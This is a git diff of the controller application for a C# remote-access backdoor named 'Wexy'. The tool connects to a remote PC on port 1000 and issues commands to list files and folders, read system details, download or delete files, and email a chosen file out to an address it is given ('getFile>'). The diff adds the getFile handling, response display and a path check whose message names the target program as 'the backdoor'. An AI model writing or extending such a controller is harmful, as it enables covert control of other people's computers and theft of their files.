@@ -15,7 +15,6 @@ namespace Wexy
     public partial class MainForm : KryptonForm
     {
         public static string received_data;
-        public static bool isConnected; //This will allow us to track whether or not we are connected to a server
         public static NetworkStream Receiver; //this is used to get data from the server
         public static NetworkStream Writer; //this is used to send commands to the server
         public static string remotepcIp;
@@ -31,7 +30,7 @@ namespace Wexy
         {
             try
             {
-                if (Command != "showfiles>" && Command != "pcname>" && Command != "showfolders>" && Command != "getos>" && Command != "ischruser>" && Command != "download>")
+                if (Command != "showfiles>" && Command != "pcname>" && Command != "showfolders>" && Command != "getos>" && Command != "ischruser>" && Command != "download>" && Command != "getFile>")
                 {
                     byte[] Packet = Encoding.ASCII.GetBytes(Command);
                     Writer.Write(Packet, 0, Packet.Length);
@@ -81,12 +80,17 @@ namespace Wexy
                             Writer.Flush();
                             //ReceiveFile();
                             break;
+                        case "getFile>":
+                            byte[] Packet6 = Encoding.ASCII.GetBytes(Command);
+                            Writer.Write(Packet6, 0, Packet6.Length);
+                            Writer.Flush();
+                            ReceiveData();
+                            break;
                     }
                 }
             }
             catch
             {
-                isConnected = false;
                 Writer.Close();
             }
         }
@@ -177,7 +181,6 @@ namespace Wexy
             try
             {
                 client.Connect(remotepcIp, 1000);
-                isConnected = true;
                 Writer = client.GetStream();
                 Receiver = client.GetStream();
                 SendCommand("pcname>");
@@ -214,18 +217,26 @@ namespace Wexy
         private void btn_showfiles_Click(object sender, EventArgs e)
         {
             // I added ReceiveData() here because there is a bug when using args(instruction>args) , the data is not retrieved and is pending, so I call it again.
-            lstbox_filesfolders.Items.Clear();
-            lstbox_filesfolders.Focus();
-            string dir_path = txb_directorypath.Text;
-            SendCommand("showfiles>" + dir_path + ">");
-            ReceiveData();
-            lbl_filefolder.Text = "Files";
-
-            string[] strings = received_data.Split('\n');
-            foreach (string item in strings)
+            if (txb_directorypath.Text[txb_directorypath.Text.Length - 1] == '/')
             {
-                lstbox_filesfolders.Items.Add(item);
+                lstbox_filesfolders.Items.Clear();
+                lstbox_filesfolders.Focus();
+                string dir_path = txb_directorypath.Text;
+                SendCommand("showfiles>" + dir_path + ">");
+                ReceiveData();
+                lbl_filefolder.Text = "Files";
+
+                string[] strings = received_data.Split('\n');
+                foreach (string item in strings)
+                {
+                    lstbox_filesfolders.Items.Add(item);
+                }
             }
+            else
+            {
+                MessageBox.Show("This is not a folder , the backdoor may crash. If it is , add a '/' at the end.");
+            }
+            
         }
         private void btn_showdir_Click(object sender, EventArgs e)
         {
@@ -257,6 +268,8 @@ namespace Wexy
             string password = txb_mailfrompass.Text;
             string to = txb_mailto.Text;
             SendCommand("getFile>" + path + ">" + from + ">" + password + ">" + to+">");
+            ReceiveData();
+            MessageBox.Show(received_data);
         }
 
         private void btn_deletefile_Click(object sender, EventArgs e)
@@ -331,7 +344,7 @@ namespace Wexy
             {
                 
                 txb_directorypath.Text = txb_directorypath.Text + lstbox_filesfolders.SelectedItem.ToString();
-                int index1 = txb_directorypath.Text.IndexOf(" -");
+                int index1 = txb_directorypath.Text.IndexOf(" |");
                 txb_directorypath.Text = txb_directorypath.Text.Remove(index1);
             }
         }
